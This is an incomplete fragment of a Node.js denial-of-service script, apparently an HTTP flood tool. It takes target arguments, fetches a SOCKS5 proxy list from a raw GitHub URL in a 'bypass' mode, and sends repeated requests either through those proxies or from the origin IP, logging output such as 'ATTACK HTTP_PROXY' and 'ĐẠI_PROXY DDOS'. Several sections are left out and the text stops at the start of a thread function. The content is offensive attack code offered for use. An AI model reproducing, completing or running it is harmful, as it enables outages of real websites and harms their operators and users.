...
async function main_process() {
    if (process.argv.length !== 6) {
        ...
        if (process.argv[5] == 'bypass') {
            ...
            const raw_github_sock = await axios.get('https://raw.githubusercontent.com/dai512/kk/main/socks5.txt');
            var proxies = raw_github_sock.data.replace(/\r/g, '').split('\n');
        } else {
            console.log("ATTACK HTTP_PROXY")
        ...
        function run() {
            if (process.argv[5] !== 'bypass') {
                ...
                proxiedRequest(config, function (error, response) {
                    console.log(response.statusCode,"ĐẠI_PROXY DDOS");
                    if (proxies.length == 0) {
                        process.exit(0);
                    }
                ...
                request(config, function (error, response) {
                    console.log(response.statusCode,"ĐẠI_IP GỐC");
                });
            }
        }
        function thread(){
